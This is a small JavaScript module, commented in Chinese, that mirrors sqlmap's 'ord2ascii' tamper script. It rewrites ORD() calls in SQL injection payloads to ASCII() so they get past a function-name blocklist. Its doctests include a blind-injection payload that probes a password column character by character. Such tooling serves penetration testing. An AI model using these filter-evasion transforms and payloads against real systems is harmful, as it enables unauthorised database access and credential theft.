// 对标 sqlmap ord2ascii.py：ORD( 函数改写为 ASCII(，绕过函数名黑名单
export const ord2ascii = {
  name: 'ord2ascii',
  description: '将 ORD() 函数改写为等价 ASCII()（绕过 ORD 函数名黑名单）',
  doctests: [
    { input: "ORD('42')", output: "ASCII('42')" },
    { input: "1 AND ORD(MID(pw,1,1))>71", output: "1 AND ASCII(MID(pw,1,1))>71" },
    { input: '1 AND 1=1', output: '1 AND 1=1' },
  ],
  transform(payload) {
    return String(payload ?? '').replace(/\bORD\(/gi, 'ASCII(');
  },
};
export default ord2ascii;
